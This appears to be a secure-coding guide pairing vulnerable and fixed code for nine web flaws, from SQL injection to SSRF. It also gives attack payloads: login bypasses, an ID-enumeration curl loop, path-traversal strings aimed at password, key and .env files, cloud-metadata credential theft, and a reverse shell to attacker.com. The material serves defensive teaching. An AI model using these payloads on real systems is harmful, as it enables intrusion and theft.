SQL Injection (SQLi)
DATABASE CRITICAL
▾
// vulnerable code

User input is concatenated directly into a SQL query string. The database parser cannot distinguish data from commands.

▲ VULNERABLE — Java / JDBC 
// username = "admin' OR '1'='1"
String query = "SELECT * FROM users WHERE "
  + "username='" + username + "'";

Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);
// Query becomes:
// SELECT * FROM users WHERE username='admin'
// OR '1'='1'  ← always true, returns ALL rows
✓ SAFE — Prepared Statement 
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement ps = conn.prepareStatement(query);
ps.setString(1, username); // treated as DATA, not code
ResultSet rs = ps.executeQuery();
// runtime behavior

An attacker sends a payload like ' OR '1'='1 or '; DROP TABLE users; --. The database executes it as legitimate SQL. Symptoms: unexpected data returned, login bypass (system accepts any password), database errors leaking table/column names in HTTP responses, application pausing then returning huge payloads.

▸ ATTACK LOG PATTERN 
POST /login HTTP/1.1
username=admin'--&password=anything

→ DB executes:
SELECT * FROM users
WHERE username='admin'--' AND password='...'
      ↑ comment kills password check

# Blind SQLi — no visible error but behavior changes:
username=admin' AND SLEEP(5)--
→ response delays exactly 5s = vulnerable
  • Always use parameterized queries / prepared statements
  • Use an ORM (Hibernate, JPA) with named parameters
  • Whitelist-validate input types (int stays int)
  • Least-privilege DB accounts (no DROP, no xp_cmdshell)
NoSQL Injection (MongoDB)
DATABASE CRITICAL
▾
// vulnerable code

JSON body from the request is passed directly into a MongoDB query. Since MongoDB uses operator objects ($gt, $where), an attacker injects query operators rather than SQL keywords.

▲ VULNERABLE — Node.js / Express 
// body: { "username": {"$gt": ""}, "password": {"$gt": ""} }
const user = await User.findOne(req.body);
// $gt:"" matches EVERY document → login bypass
✓ SAFE 
const { username, password } = req.body;
// Enforce string types explicitly
if (typeof username !== 'string' ||
    typeof password !== 'string') {
  return res.status(400).send('Invalid input');
}
const user = await User.findOne({ username, password });
// runtime behavior

Login returns a valid session for any user. Admin panel accessible without knowing any credentials. The server log shows normal 200 responses. No SQL error messages — harder to detect than classic SQLi. The attack JSON looks like: {"username":{"$gt":""},"password":{"$gt":""}}

▸ ATTACK PAYLOAD 
POST /api/login
Content-Type: application/json

{
  "username": {"$gt": ""},
  "password": {"$gt": ""}
}

→ MongoDB: db.users.findOne({
    username: {$gt: ""},   // matches all usernames
    password: {$gt: ""}    // matches all passwords
  })
→ Returns first user (often admin)
  • Validate and cast all inputs to expected primitive types
  • Use mongoose schema validation with strict types
  • Sanitize with mongo-sanitize or express-mongo-sanitize
  • Never spread req.body directly into queries
Insecure Direct Object Reference (IDOR)
DATABASE HIGH
▾
// vulnerable code

A resource ID from the URL is used directly to query the database without verifying the requesting user actually owns that resource.

▲ VULNERABLE — Spring Boot 
// GET /api/orders/42 → attacker changes 42 → 43, 44...
@GetMapping("/api/orders/{id}")
public Order getOrder(@PathVariable Long id) {
  return orderRepo.findById(id).orElseThrow();
  // No ownership check — any logged-in user
  // can read ANY order by guessing IDs
}
✓ SAFE 
@GetMapping("/api/orders/{id}")
public Order getOrder(@PathVariable Long id,
                      @AuthenticationPrincipal User user) {
  Order order = orderRepo.findById(id).orElseThrow();
  if (!order.getUserId().equals(user.getId())) {
    throw new AccessDeniedException("Forbidden");
  }
  return order;
}
// runtime behavior

Attacker logs in as any user, observes their own ID in the URL (e.g., /orders/105), then iterates: /orders/1, /orders/2... All return 200 with other users' data. In finance/healthcare apps, this is a catastrophic data breach with no anomalous error logs — just normal successful GETs.

▸ ENUMERATION SCRIPT 
# Bash — extract all orders, not just yours
for i in $(seq 1 500); do
  curl -s -H "Authorization: Bearer $TOKEN" \
    https://app.com/api/orders/$i | \
    jq '.email, .total'
done

# Server logs look completely normal:
# 200 GET /api/orders/1
# 200 GET /api/orders/2  ← no alarm triggered
  • Always verify resource ownership against authenticated user
  • Use UUIDs instead of sequential IDs (harder to enumerate)
  • Apply @PreAuthorize or policy-based access at service layer
  • Rate-limit and alert on high-frequency sequential GETs
Broken Authentication & Session Fixation
AUTH / SESSION CRITICAL
▾
// vulnerable code

The session ID is not regenerated after login. An attacker who knows the pre-login session ID (e.g., by injecting it) gets authenticated access after the victim logs in.

▲ VULNERABLE — PHP 
// session_start() re-uses the same PHPSESSID
// that existed before login
session_start();

if (authenticate($_POST['user'], $_POST['pass'])) {
  $_SESSION['user_id'] = $userId; // ← same old session ID
  header('Location: /dashboard');
}
✓ SAFE 
session_start();

if (authenticate($_POST['user'], $_POST['pass'])) {
  session_regenerate_id(true); // ← NEW session ID on login
  $_SESSION['user_id'] = $userId;
  header('Location: /dashboard');
}
// runtime behavior

Attacker visits the login page, captures the PHPSESSID cookie from the response. Tricks the victim into loading the page with that session ID (via link, XSS, etc.). When the victim logs in, the same cookie is now authenticated. Attacker uses their cookie to access the victim's authenticated session — server sees only one legitimate session.

▸ FIXATION FLOW 
1. Attacker: GET /login
   ← Set-Cookie: PHPSESSID=abc123

2. Attacker sends victim:
   https://site.com/login?PHPSESSID=abc123

3. Victim logs in with PHPSESSID=abc123
   (server accepts it, no regeneration)

4. Attacker: GET /dashboard
   Cookie: PHPSESSID=abc123  ← now authenticated!
  • Call session_regenerate_id(true) immediately after login
  • Never accept session IDs from URL parameters
  • Set session cookies: HttpOnly, Secure, SameSite=Strict
  • Expire sessions on logout (invalidate server-side)
Weak / Unsalted Password Hashing
AUTH / SESSION CRITICAL
▾
// vulnerable code

Using fast, unsalted hashes (MD5, SHA-1, plain SHA-256) for passwords. These are trivially cracked via rainbow tables or GPU brute-force at billions of hashes per second.

▲ VULNERABLE 
// MD5 — cracked in milliseconds
String hash = DigestUtils.md5Hex(password);
db.save(user, hash);

// Even SHA-256 without salt is weak:
MessageDigest md = MessageDigest.getInstance("SHA-256");
byte[] hash = md.digest(password.getBytes());
// "password123" always hashes to the same value
// → rainbow table lookup takes <1 second
✓ SAFE — BCrypt / Argon2 
// Spring Security BCrypt (Java)
BCryptPasswordEncoder encoder =
  new BCryptPasswordEncoder(12); // cost=12
String hash = encoder.encode(rawPassword);

// Verification
boolean valid = encoder.matches(rawPassword, storedHash);

// Argon2 (Node.js) — even better
const hash = await argon2.hash(password, {
  type: argon2.argon2id, memoryCost: 65536
});
// runtime behavior

Database breach occurs. Attacker dumps the users table. MD5 hashes are cracked in bulk using Hashcat + GPU in minutes. Unsalted SHA-256 hashes are reversed via lookup tables instantly. BCrypt with cost 12 takes ~300ms per attempt — infeasible to crack at scale even after a breach.

▸ CRACK SPEED COMPARISON 
MD5:          ~100 BILLION hashes/sec (GPU)
SHA-1:         ~50 BILLION hashes/sec
SHA-256:       ~10 BILLION hashes/sec
SHA-256+salt:   ~10 BILLION hashes/sec (salt doesn't slow it)

BCrypt(10):      ~100 hashes/sec  ← intentionally slow
BCrypt(12):       ~25 hashes/sec
Argon2id:         ~10 hashes/sec  ← memory-hard too

# "password123" cracked from MD5 dump:
$ hashcat -m 0 hashes.txt rockyou.txt
# Time: 0.4 seconds for 1M hashes
  • Use BCrypt (cost ≥ 12), Argon2id, or scrypt for passwords
  • Never use MD5, SHA-1, SHA-256 for password storage
  • Use a unique salt per password (BCrypt does this automatically)
  • Re-hash on login when upgrading algorithm
Mass Assignment
DATABASE HIGH
▾
// vulnerable code

Request body fields are bound directly to a model object. An attacker adds unexpected fields (like role or isAdmin) that get persisted to the database.

▲ VULNERABLE — Laravel / Eloquent 
// User model: $fillable not set (or too broad)
// Attacker sends: { "name": "Bob", "role": "admin" }

public function update(Request $request) {
  $user->fill($request->all()); // binds EVERYTHING
  $user->save();
  // role is now "admin" in DB
}
✓ SAFE 
// In User model — explicit allowlist
protected $fillable = ['name', 'email', 'bio'];
// 'role', 'is_admin' NOT in $fillable

// Or use validated DTO in controller
$validated = $request->validate([
  'name'  => 'required|string|max:100',
  'email' => 'required|email',
]);
$user->fill($validated)->save();
// runtime behavior

The profile update endpoint behaves normally — returns 200, updates the name. But behind the scenes, the attacker's extra field ("is_admin": true) was also written to the database. The next login gives the attacker admin privileges. No error, no log spike — just a silent privilege escalation.

▸ EXPLOIT REQUEST 
PATCH /api/user/profile
Content-Type: application/json

{
  "name": "Bob Smith",
  "email": "bob@example.com",
  "is_admin": true,       ← injected
  "role": "superuser",    ← injected
  "credit_balance": 99999 ← injected
}

→ 200 OK  (looks like normal profile update)
→ DB: users SET is_admin=1 WHERE id=42
  • Always define explicit $fillable or use DTOs/form requests
  • Set $guarded = ['*'] as default, opt-in per field
  • Never pass $request->all() to model methods directly
  • Validate and sanitize before persistence
OS Command Injection
SYSTEM CRITICAL
▾
// vulnerable code

User input is passed into a shell command via exec(), Runtime.exec(), or similar. Shell metacharacters allow chaining arbitrary commands.

▲ VULNERABLE — Node.js 
// endpoint: GET /ping?host=8.8.8.8
// attacker sends: host=8.8.8.8;cat /etc/passwd
const { host } = req.query;
exec(`ping -c 1 ${host}`, (err, stdout) => {
  res.send(stdout);
});
// Shell runs: ping -c 1 8.8.8.8; cat /etc/passwd
✓ SAFE 
// Use execFile — no shell interpretation
const { execFile } = require('child_process');
const ip = host.replace(/[^0-9.]/g, ''); // whitelist chars
execFile('/bin/ping', ['-c', '1', ip], (err, stdout) => {
  res.send(stdout);
});
// Args passed as array — shell never invoked
// runtime behavior

Attacker chains commands using ;, &&, ||, or backticks. The server executes them with its own OS permissions — which is often the web server user. A classic escalation path: read /etc/passwd → write SSH keys → reverse shell. The application returns a 200 with ping output AND the injected command output mixed in.

▸ ESCALATION CHAIN 
Step 1 — Recon:
GET /ping?host=127.0.0.1;whoami
→ www-data

Step 2 — Read secrets:
GET /ping?host=127.0.0.1;cat /var/www/.env
→ DB_PASSWORD=super_secret_prod

Step 3 — Reverse shell:
GET /ping?host=127.0.0.1;bash+-c+'bash+-i+>&+/dev/tcp/attacker.com/4444+0>&1'
→ Interactive shell on attacker's machine
  • Use execFile/spawn with argument arrays, never exec with strings
  • Whitelist input: only allow [a-zA-Z0-9.-] for hostnames
  • Run the web process as a non-privileged user
  • Consider alternatives to shell commands entirely (e.g., ICMP libraries)
Path Traversal (Directory Traversal)
SYSTEM HIGH
▾
// vulnerable code

A filename from user input is joined with a base directory without sanitizing ../ sequences. The resulting path escapes the intended directory.

▲ VULNERABLE — Java 
// GET /download?file=../../../etc/passwd
String base = "/var/www/uploads/";
String filename = request.getParameter("file");
File f = new File(base + filename);

sendFile(response, f);
// Resolves to: /etc/passwd
✓ SAFE 
File base = new File("/var/www/uploads").getCanonicalFile();
File f = new File(base, filename).getCanonicalFile();

if (!f.getPath().startsWith(base.getPath() + File.separator)) {
  throw new SecurityException("Path traversal detected");
}
sendFile(response, f);
// runtime behavior

Response body contains the contents of /etc/passwd, /proc/self/environ (env vars, database URLs), or application source code. Can be used to read private keys, .env files, or config files. Encoded variants (%2e%2e%2f, ..%2F) bypass naive string-based filters.

▸ BYPASS VARIANTS 
Basic:          ?file=../../../etc/passwd
URL-encoded:    ?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
Double-encoded: ?file=%252e%252e%252f...
Null byte:      ?file=../../../etc/passwd%00.png
Windows:        ?file=..\..\windows\win.ini

# What attackers target:
/etc/passwd          # user enumeration
/proc/self/environ   # env vars, secrets
/var/www/.env        # DB creds, API keys
~/.ssh/id_rsa        # private keys
  • Resolve canonical paths and verify they start with base dir
  • Never use raw user input as filenames
  • Use an allowlist of permitted filenames or UUIDs as file keys
  • Serve files through a CDN or object storage instead of filesystem reads
Server-Side Request Forgery (SSRF)
SYSTEM CRITICAL
▾
// vulnerable code

The server makes an HTTP request to a URL supplied by the user. An attacker uses this to probe internal services, access cloud metadata endpoints, or reach localhost services that are not exposed externally.

▲ VULNERABLE — Python 
# POST /fetch  body: {"url": "http://169.254.169.254/..."}
import requests

def fetch_url(url):
    resp = requests.get(url)  # no validation
    return resp.text

# Attacker hits AWS EC2 metadata:
# http://169.254.169.254/latest/meta-data/
# → returns IAM role credentials
✓ SAFE 
from urllib.parse import urlparse
import ipaddress

def is_safe_url(url):
    parsed = urlparse(url)
    host = parsed.hostname
    try:
        ip = ipaddress.ip_address(host)
        if ip.is_private or ip.is_loopback:
            return False
    except ValueError:
        pass  # hostname, not IP — also check DNS
    return parsed.scheme in ['http', 'https']
// runtime behavior

The server fetches the attacker-supplied URL from inside the network. On AWS/GCP/Azure, the metadata endpoint at 169.254.169.254 returns temporary IAM credentials, allowing full cloud account takeover. On internal networks, SSRF maps internal services (http://10.0.0.1:8080/admin) that are invisible to the attacker externally.

▸ CLOUD METADATA TAKEOVER 
POST /api/fetch-preview
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

← {"AccessKeyId": "ASIA...",
    "SecretAccessKey": "...",
    "Token": "...",
    "Expiration": "2026-05-12T18:00:00Z"}

# Attacker now has temporary AWS keys:
$ aws s3 ls --no-sign-request (using stolen creds)
→ Full S3 bucket access, EC2 control
  • Block requests to private/loopback IPs and link-local ranges
  • Use an allowlist of permitted external domains
  • Disable IMDSv1; require IMDSv2 (token-based) on AWS
  • Run fetch workers in isolated network segments with no internal access
